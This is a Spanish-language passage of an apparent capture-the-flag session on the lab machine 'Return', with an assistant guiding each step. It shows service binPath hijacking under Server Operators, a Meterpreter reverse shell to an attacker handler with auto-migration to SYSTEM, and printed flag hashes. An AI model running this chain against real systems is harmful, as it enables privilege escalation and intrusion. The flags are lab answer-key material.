revisaremos handler, puerto, binario y posible bloqueo antes de repetir.
```
### Ejecutamos:

(Meterpreter 2)(C:\Windows\system32) > whoami
[-] Unknown command: whoami. Run the help command for more details.
(Meterpreter 2)(C:\Windows\system32) >

### Objetivo

Corregir el comando usado dentro de Meterpreter y confirmar el usuario efectivo de la sesión recibida.

### Hechos verificados

La sesión Meterpreter está abierta:

```text
(Meterpreter 2)(C:\Windows\system32) >
```

El comando `whoami` no es un comando nativo de Meterpreter:

```text
[-] Unknown command: whoami.
```

### Suposiciones

La sesión sigue viva y está ejecutándose desde `C:\Windows\system32`.

### Método

En Meterpreter, primero se usa el comando propio `getuid` para identificar el contexto de usuario.

### Respuesta

No pasa nada: estás en **Meterpreter**, no en una consola `cmd.exe`.

El equivalente correcto ahora es `getuid`.

### Comandos

En Meterpreter:

```text
getuid
```

### Comprobaciones

Pásame solo la salida de `getuid`.

Criterio de decisión:

```text
Si devuelve NT AUTHORITY\SYSTEM:
la escalada queda confirmada.

Si devuelve return\svc-printer u otro usuario:
habrá que revisar el contexto real de ejecución.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start vss
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

(Meterpreter 2)(C:\Windows\system32) > whoami
[-] Unknown command: whoami. Run the help command for more details.
(Meterpreter 2)(C:\Windows\system32) > 
[*] 10.129.95.241 - Meterpreter session 2 closed.  Reason: Died

### Objetivo

Aclarar el punto de desviación y corregir el flujo para seguir la cadena prevista: `vss` → Meterpreter → migración rápida a proceso estable.

### Hechos verificados

La vía correcta ya está confirmada:

```text
svc-printer pertenece a Server Operators
vss corre como LocalSystem
svc-printer puede modificar el binPath de vss
Metasploit recibe sesión Meterpreter
```

La sesión Meterpreter se abre, pero muere enseguida:

```text
Meterpreter session 2 closed. Reason: Died
```

El comando `whoami` no era válido en Meterpreter:

```text
Unknown command: whoami
```

### Suposiciones

La sesión muere porque el proceso lanzado por el servicio no se mantiene estable el tiempo suficiente.

El siguiente intento debe ir directo a lo que falta: **migrar rápidamente** cuando abra Meterpreter, no interactuar con comandos de `cmd`.

### Método

Sí: la cadena técnica es la correcta.
El error operativo ha sido no migrar inmediatamente al abrir Meterpreter.

Antes de repetir nada, hay que dejar `vss` restaurado.

### Respuesta

Sí, se está siguiendo la cadena correcta, pero aquí hemos perdido tiempo intentando validar con `whoami`/ficheros y luego con Meterpreter sin migrar rápido.

La corrección es:

```text
restaurar vss
→ preparar handler
→ lanzar shell64.exe con vss
→ cuando abra Meterpreter: ps
→ migrar rápido a un proceso SYSTEM estable
```

Ahora solo hacemos el primer paso: restaurar `vss`.

### Comandos

En Evil-WinRM:

```powershell
sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio:

```text
Si devuelve ChangeServiceConfig SUCCESS:
confirmamos con sc.exe qc vss.

Si falla:
no repetimos Meterpreter hasta restaurarlo.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
[SC] ChangeServiceConfig SUCCESS

### Objetivo

Confirmar que el servicio `vss` ha quedado restaurado a su binario original antes de repetir la ejecución y preparar la migración rápida de la sesión.

### Hechos verificados

La restauración del servicio ha sido aceptada:

```text
[SC] ChangeServiceConfig SUCCESS
```

La sesión Meterpreter anterior llegó a abrirse, pero murió antes de poder migrar a un proceso estable.

### Suposiciones

El servicio debería volver a apuntar a:

```text
C:\Windows\system32\vssvc.exe
```

Antes de repetir cualquier intento, hay que confirmar que `vss` está limpio.

### Método

Siguiente paso único:

```text
Comprobar la configuración actual de vss.
```

No se reinicia el servicio ni se relanza `shell64.exe` hasta confirmar el estado correcto.

### Respuesta

Correcto. La sesión debe migrarse rápido en cuanto vuelva a abrirse, pero antes toca dejar `vss` confirmado y limpio.

Ahora solo comprobamos la configuración.

### Comandos

En Evil-WinRM:

```powershell
sc.exe qc vss
```

### Comprobaciones

Pásame solo la salida de `sc.exe qc vss`.

Criterio de decisión:

```text
Si BINARY_PATH_NAME es C:\Windows\system32\vssvc.exe:
el siguiente paso será preparar la repetición con migración inmediata.

Si sigue apuntando a shell64.exe:
no se continúa hasta restaurarlo correctamente.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe qc vss
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Volume Shadow Copy
        DEPENDENCIES       : RPCSS
        SERVICE_START_NAME : LocalSystem

### Objetivo

Preparar Metasploit para que la próxima sesión Meterpreter intente migrar automáticamente al abrirse, evitando que muera antes de poder interactuar manualmente.

### Hechos verificados

El servicio `vss` está restaurado correctamente:

```text
BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
SERVICE_START_NAME : LocalSystem
```

La vía de ejecución funciona, porque ya se han recibido sesiones Meterpreter.

Las sesiones mueren antes de permitir una interacción cómoda.

### Suposiciones

El problema actual es de estabilidad del proceso inicial, no de la primitiva de escalada.

Migrar rápidamente a otro proceso puede estabilizar la sesión.

### Método

El siguiente paso único se hará en Metasploit: configurar migración automática al recibir la próxima sesión.

No se tocará todavía `vss`.

### Respuesta

`vss` está limpio. Ahora no repetimos todavía el arranque del servicio.

Primero vamos a preparar Metasploit para que, cuando entre la próxima sesión, intente migrar automáticamente. Así no dependemos de escribir `ps` y `migrate` a mano antes de que muera.

### Comandos

En Metasploit:

```text
set AutoRunScript post/windows/manage/migrate
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio de decisión:

```text
Si Metasploit acepta AutoRunScript:
el siguiente paso será revisar opciones y relanzar el handler.

Si da error:
usaremos otra forma de automatizar o acelerar la migración.
```
### Ejecutamos:

[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set AutoRunScript post/windows/manage/migrate
AutoRunScript => post/windows/manage/migrate

### Objetivo

Arrancar de nuevo el handler x64 de Metasploit, ahora con migración automática configurada para intentar estabilizar la sesión al abrirse.

### Hechos verificados

Metasploit ha aceptado la migración automática:

```text
AutoRunScript => post/windows/manage/migrate
```

El servicio `vss` está restaurado y limpio.

El payload activo sigue siendo el x64 configurado para:

```text
windows/x64/meterpreter/reverse_tcp
10.10.15.26:4444
```

### Suposiciones

El handler no está escuchando ahora mismo porque la sesión anterior murió y Metasploit volvió al prompt.

La próxima sesión intentará ejecutar la migración automática al abrirse.

### Método

Siguiente paso único:

```text
Arrancar de nuevo el handler.
```

No se toca todavía `vss`.

### Respuesta

Bien. Ahora dejamos Metasploit escuchando otra vez, ya con `AutoRunScript` configurado.

### Comandos

En Metasploit:

```text
run
```

### Comprobaciones

Pásame solo la salida inicial de `run`.

Criterio de decisión:

```text
Si aparece Started reverse TCP handler on 10.10.15.26:4444:
el siguiente paso será volver a configurar vss con shell64.exe.

Si da error:
se corrige antes de tocar el servicio.
```
### Ejecutamos:

[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 10.10.15.26:4444

### Objetivo

Configurar de nuevo el servicio `vss` para ejecutar `shell64.exe`, ahora con Metasploit preparado para intentar migración automática al abrirse la sesión.

### Hechos verificados

El handler x64 está escuchando correctamente:

```text
[*] Started reverse TCP handler on 10.10.15.26:4444
```

La migración automática quedó configurada previamente:

```text
AutoRunScript => post/windows/manage/migrate
```

El servicio `vss` estaba restaurado antes de preparar este nuevo intento.

### Suposiciones

`shell64.exe` sigue presente en:

```text
C:\Users\svc-printer\Documents\shell64.exe
```

El handler sigue activo en Metasploit y esperando conexión.

### Método

El siguiente paso único es modificar `vss` para que vuelva a apuntar a `shell64.exe`.

No se iniciará todavía el servicio hasta comprobar después que el `binPath` quedó correctamente aplicado.

### Respuesta

Metasploit ya está esperando. Ahora vuelve a Evil-WinRM y configura solo el servicio con `shell64.exe`.

### Comandos

En Evil-WinRM:

```powershell
sc.exe config vss binPath= "C:\Users\svc-printer\Documents\shell64.exe"
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio de decisión:

```text
Si devuelve ChangeServiceConfig SUCCESS:
el siguiente paso será comprobar el binPath con sc.exe qc vss.

Si devuelve error:
se corrige antes de iniciar vss.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath= "C:\Users\svc-printer\Documents\shell64.exe"
[SC] ChangeServiceConfig SUCCESS

### Objetivo

Comprobar que `vss` quedó configurado con `shell64.exe` antes de iniciar el servicio.

### Hechos verificados

La modificación del servicio se aplicó correctamente:

```text
[SC] ChangeServiceConfig SUCCESS
```

El handler x64 de Metasploit está escuchando en:

```text
10.10.15.26:4444
```

La migración automática está configurada en Metasploit.

### Suposiciones

Aunque el cambio haya devuelto éxito, hay que verificar el `BINARY_PATH_NAME` antes de arrancar `vss`.

### Método

Siguiente paso único:

```text
Consultar la configuración actual de vss.
```

### Respuesta

Bien. Ahora no arranques todavía el servicio. Primero confirmamos que el `binPath` apunta a `shell64.exe`.

### Comandos

En Evil-WinRM:

```powershell
sc.exe qc vss
```

### Comprobaciones

Pásame solo la salida de `sc.exe qc vss`.

Criterio de decisión:

```text
Si BINARY_PATH_NAME apunta a C:\Users\svc-printer\Documents\shell64.exe:
el siguiente paso será iniciar vss.

Si apunta a otra ruta:
se corrige antes de iniciar el servicio.
```

### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe qc vss
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\svc-printer\Documents\shell64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Volume Shadow Copy
        DEPENDENCIES       : RPCSS
        SERVICE_START_NAME : LocalSystem

### Objetivo

Iniciar `vss` para ejecutar `shell64.exe` y comprobar si Metasploit recibe una sesión Meterpreter con migración automática.

### Hechos verificados

`vss` está configurado para ejecutar:

```text
C:\Users\svc-printer\Documents\shell64.exe
```

El servicio corre como:

```text
LocalSystem
```

Metasploit está escuchando en:

```text
10.10.15.26:4444
```

La migración automática está configurada en el handler.

### Suposiciones

Al iniciar `vss`, el binario `shell64.exe` debería conectar contra Metasploit.

Puede volver a aparecer el error `1053`, pero el dato importante será si Metasploit abre sesión y si la sesión sobrevive.

### Método

Ejecutar un único paso desde Evil-WinRM y observar Metasploit.

### Respuesta

Todo está listo. Ahora inicia `vss` una sola vez.

### Comandos

En Evil-WinRM:

```powershell
sc.exe start vss
```

### Comprobaciones

Pásame solo:

```text
1. La salida de sc.exe start vss.
2. La salida nueva que aparezca en Metasploit.
```

Criterio de decisión:

```text
Si Metasploit abre sesión y no muere:
el siguiente paso será confirmar el usuario con getuid.

Si abre sesión y muere:
restauramos vss y cambiamos la táctica de estabilidad.

Si no llega sesión:
revisamos handler, binario y posible bloqueo antes de repetir.
```
### Ejecutamos:

[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 10.10.15.26:4444 
[*] Sending stage (203846 bytes) to 10.129.95.241
[*] Session ID 3 (10.10.15.26:4444 -> 10.129.95.241:49652) processing AutoRunScript 'post/windows/manage/migrate'
[*] Running module against PRINTER
[*] Current server process: shell64.exe (3856)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 688
[+] Successfully migrated into process 688
[*] Meterpreter session 3 opened (10.10.15.26:4444 -> 10.129.95.241:49652) at 2026-05-08 19:49:49 +0200

(Meterpreter 3)(C:\Windows\system32) >

### Objetivo

Confirmar el usuario efectivo de la sesión Meterpreter estabilizada tras la migración automática.

### Hechos verificados

La sesión Meterpreter ha abierto correctamente:

```text
Meterpreter session 3 opened
```

La migración automática se ha ejecutado con éxito:

```text
[+] Successfully migrated into process 688
```

El proceso inicial era:

```text
shell64.exe (3856)
```

La sesión está activa en:

```text
(Meterpreter 3)(C:\Windows\system32) >
```

### Suposiciones

La sesión debería estar ejecutándose con el contexto del servicio `vss`, es decir, `LocalSystem`, pero falta confirmarlo con evidencia directa.

### Método

El siguiente paso único es usar el comando nativo de Meterpreter para identificar el usuario de la sesión.

### Respuesta

Bien. Esta vez la sesión ha migrado correctamente y sigue viva.

Ahora confirma el contexto real. No uses `whoami` aquí; en Meterpreter el comando correcto es `getuid`.

### Comandos

En Meterpreter:

```text
getuid
```

### Comprobaciones

Pásame solo la salida de `getuid`.

Criterio de decisión:

```text
Si devuelve NT AUTHORITY\SYSTEM:
la escalada queda confirmada y el siguiente paso será leer root.txt.

Si devuelve otro usuario:
revisaremos a qué proceso migró y con qué permisos quedó la sesión.
```
### Ejecutamos:

(Meterpreter 3)(C:\Windows\system32) > getuid
Server username: NT AUTHORITY\SYSTEM

### Objetivo

Confirmar el cierre de la escalada y leer la flag final desde la sesión `Meterpreter` ya estabilizada como `NT AUTHORITY\SYSTEM`.

### Hechos verificados

La sesión `Meterpreter` está viva y estabilizada tras migración:

```text
[+] Successfully migrated into process 688
```

El contexto efectivo de la sesión es privilegiado:

```text
Server username: NT AUTHORITY\SYSTEM
```

La escalada de privilegios queda confirmada.

### Suposiciones

La flag final debería estar en la ruta habitual del administrador:

```text
C:\Users\Administrator\Desktop\root.txt
```

### Método

El siguiente paso único es leer la flag final directamente desde `Meterpreter`, sin abrir más ramas ni modificar nada más.

### Respuesta

Perfecto. Ya eres `SYSTEM`.

Ahora lee solo la flag final.

### Comandos

En `Meterpreter`:

```text
cat C:\\Users\\Administrator\\Desktop\\root.txt
```

### Comprobaciones

Pásame solo la salida del comando.

Criterio de decisión:

```text
Si devuelve el hash de root.txt:
la máquina queda resuelta.

Después de confirmar root:
se restaurará vss si todavía no quedó limpio.
```
### Ejecutamos:

(Meterpreter 3)(C:\Windows\system32) > cat C:\\Users\\Administrator\\Desktop\\root.txt
19e7fb0b6df382040351bcfd3a9cd6ce

### Objetivo

Cerrar la resolución técnica de la máquina Return tras confirmar acceso `NT AUTHORITY\SYSTEM` y obtener la flag final.

### Hechos verificados

La sesión Meterpreter quedó estabilizada tras migración:

```text
[+] Successfully migrated into process 688
```

El contexto efectivo confirmado fue:

```text
Server username: NT AUTHORITY\SYSTEM
```

La flag final se leyó correctamente:

```text
19e7fb0b6df382040351bcfd3a9cd6ce
```

La primera flag ya había sido obtenida previamente:

```text
46a4f8c3e5bba0afe3432d836dc35450
```

### Suposiciones

El servicio `vss` puede seguir apuntando temporalmente a `shell64.exe` si no se ha restaurado después del último arranque.

Antes de dar por cerrado el laboratorio, conviene dejar el servicio en su ruta original para mantener trazabilidad limpia.

### Método

La cadena validada queda cerrada así:

```text
Panel de impresora
→ captura de credencial LDAP de svc-printer
→ WinRM como svc-printer
→ grupo Server Operators
→ modificación de binPath del servicio vss
→ ejecución como LocalSystem
→ Meterpreter x64 con migración automática
→ NT AUTHORITY\SYSTEM
→ root.txt
```

El hallazgo dominante final es:

```text
Abuso del grupo Server Operators para modificar un servicio ejecutado como LocalSystem.
```

### Respuesta

Máquina resuelta.

Queda un único paso de limpieza: restaurar `vss` a su binario original y comprobarlo. Después ya podemos preparar el MD didáctico final con toda la cadena, incluidos los errores útiles de contexto, estabilidad y restauración del servicio.

### Comandos

En Evil-WinRM:

```powershell
sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio de cierre:

```text
Si devuelve ChangeServiceConfig SUCCESS:
se comprobará una última vez con sc.exe qc vss.

Si vss queda restaurado:
la máquina queda técnicamente cerrada y lista para reconstruir el MD final.
```

### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
[SC] ChangeServiceConfig SUCCESS

### Objetivo

Confirmar que `vss` quedó restaurado a su binario original y cerrar la máquina con el servicio limpio.

### Hechos verificados

La restauración del servicio fue aceptada:

```text
[SC] ChangeServiceConfig SUCCESS
```

La máquina ya está resuelta con acceso confirmado como `NT AUTHORITY\SYSTEM` y lectura de `root.txt`.

### Suposiciones

El servicio debería apuntar de nuevo a:

```text
C:\Windows\system32\vssvc.exe
```

Falta una última comprobación visual para cerrar la trazabilidad sin dejar el servicio alterado.

### Método

Último paso único: consultar la configuración actual de `vss`.

### Respuesta

Bien. Solo queda comprobar que `vss` está limpio y cerramos técnicamente la máquina.

### Comandos

En Evil-WinRM:

```powershell
sc.exe qc vss
```

### Comprobaciones

Pásame solo la salida de `sc.exe qc vss`.

Criterio de cierre:

```text
Si BINARY_PATH_NAME es C:\Windows\system32\vssvc.exe:
Return queda cerrada técnicamente y lista para reconstruir el MD final didáctico.
```

### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe qc vss
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Volume Shadow Copy
        DEPENDENCIES       : RPCSS
        SERVICE_START_NAME : LocalSystem

### Objetivo

Cerrar técnicamente la máquina Return con el servicio `vss` restaurado y la cadena de explotación validada hasta `NT AUTHORITY\SYSTEM`.

### Hechos verificados

El servicio `vss` ha quedado restaurado a su binario original:

```text
BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
```

El servicio mantiene su contexto original de ejecución:

```text
SERVICE_START_NAME : LocalSystem
```

La máquina quedó resuelta previamente con sesión privilegiada confirmada:

```text
Server username: NT AUTHORITY\SYSTEM
```

La flag de usuario fue obtenida:

```text
46a4f8c3e5bba0afe3432d836dc35450
```

La flag final fue obtenida:

```text
19e7fb0b6df382040351bcfd3a9cd6ce
```

### Suposiciones

No quedan cambios pendientes sobre el servicio `vss`.

El laboratorio está en condiciones de pasar a fase documental y reconstruir el MD final didáctico.

### Método

La cadena técnica validada queda cerrada así:

```text
Panel de administración de impresora
→ configuración LDAP con usuario svc-printer
→ captura de credencial LDAP
→ validación de credencial por WinRM
→ shell como return\svc-printer
→ pertenencia a Server Operators
→ modificación del binPath de vss
→ ejecución como LocalSystem
→ Meterpreter x64 con migración automática
→ NT AUTHORITY\SYSTEM
→ lectura de root.txt
→ restauración de vss
```

El hallazgo dominante final es:

```text
Abuso de Server Operators para modificar un servicio ejecutado como LocalSystem.
```

### Respuesta

Return queda técnicamente cerrada.

La fase final importante no ha sido solo obtener `root.txt`, sino dejar documentada la relación causal completa:

```text
credencial de servicio expuesta por panel
+ WinRM habilitado
+ Server Operators
+ servicio LocalSystem modificable
= ejecución privilegiada
```

También queda registrada una lección operativa útil: la shell directa con `nc.exe` y el primer Meterpreter fueron inestables; la sesión se estabilizó al usar payload x64 y migración automática.

### Comandos

No hay más comandos necesarios para la explotación.

### Comprobaciones

Cierre validado:

```text
vss restaurado: sí
usuario SYSTEM confirmado: sí
user.txt obtenido: sí
root.txt obtenido: sí
máquina resuelta: sí
```
